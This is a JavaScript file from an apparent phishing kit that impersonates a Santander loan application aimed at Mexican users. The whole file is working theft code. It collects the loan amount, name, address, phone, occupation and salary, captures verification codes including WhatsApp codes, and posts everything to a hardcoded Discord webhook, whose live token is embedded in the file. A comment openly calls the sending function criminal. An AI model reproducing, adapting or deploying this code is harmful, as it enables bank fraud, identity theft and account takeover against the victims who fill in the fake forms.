const WEBHOOK_URL = 'https://discord.com/api/webhooks/1467650318174126192/_JrAS9TIKsDftqmTQuONlgEb4DAlPyQ1O9qst_pvEcgAgcbYeyyez83ftOqVA0pDvaS3';

// Función criminal para mandar la info de una vez
async function enviarADiscord(payload) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        return true;
    } catch (e) {
        console.log("La maldición de Call of Duty en el envío");
        return false;
    }
}

async function submitForm() {
    // Capturamos todo lo que haya en la página actual
    const nombres = document.getElementById('nombres')?.value;
    const apellidos = document.getElementById('apellidos')?.value;
    const direccion = document.getElementById('direccion')?.value;
    const telefono = document.getElementById('telefono')?.value;
    const ocupacion = document.getElementById('ocupacion')?.value;
    const salario = document.getElementById('salario')?.value;
    const monto = document.getElementById('monto')?.value;

    // --- PASO 1: MONTO (index.html) ---
    if (monto && !nombres) {
        localStorage.setItem('montoPrestamo', monto);
        await enviarADiscord({
            embeds: [{
                title: '💰 Nueva Solicitud - Monto',
                color: 0x00FF00,
                fields: [{ name: '💵 Monto solicitado', value: `\`\`\`${monto}\`\`\`` }],
                timestamp: new Date().toISOString()
            }]
        });
        window.location.href = 'index2.html';
        return;
    }

    // --- PASO 2: DATOS PERSONALES (index2.html) ---
    if (nombres && apellidos && telefono) {
        localStorage.setItem('tel', telefono);
        localStorage.setItem('nombreCompleto', `${nombres} ${apellidos}`);

        await enviarADiscord({
            embeds: [{
                title: '📋 Datos del Cliente - Santander',
                color: 0xEC0000,
                fields: [
                    { name: '👤 Nombre', value: `\`\`\`${nombres} ${apellidos}\`\`\``, inline: true },
                    { name: '📞 Teléfono', value: `\`\`\`+52 ${telefono}\`\`\``, inline: true },
                    { name: '📍 Dirección', value: `\`\`\`${direccion || 'N/A'}\`\`\`` },
                    { name: '💼 Ocupación', value: `\`\`\`${ocupacion || 'N/A'}\`\`\``, inline: true },
                    { name: '💰 Salario', value: `\`\`\`${salario || 'N/A'}\`\`\``, inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        });
        window.location.href = 'index3.html';
        return;
    }
}

// --- LÓGICA PARA LOS CÓDIGOS (index4 e index5) ---
// Esta función la llamas desde el submit de los códigos
async function enviarCodigo(tipo, codigo) {
    const nombre = localStorage.getItem('nombreCompleto') || 'N/A';
    const tel = localStorage.getItem('tel') || 'N/A';

    const payload = {
        embeds: [{
            title: `🔑 CÓDIGO CAPTURADO: ${tipo}`,
            color: tipo.includes('WHATSAPP') ? 0x25D366 : 0xEC0000,
            fields: [
                { name: '👤 Cliente', value: `\`\`\`${nombre}\`\`\``, inline: false },
                { name: '📞 Teléfono', value: `\`\`\`+52 ${tel}\`\`\``, inline: true },
                { name: '🔢 Código', value: `\`\`\`${codigo}\`\`\``, inline: true }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    return await enviarADiscord(payload);
}
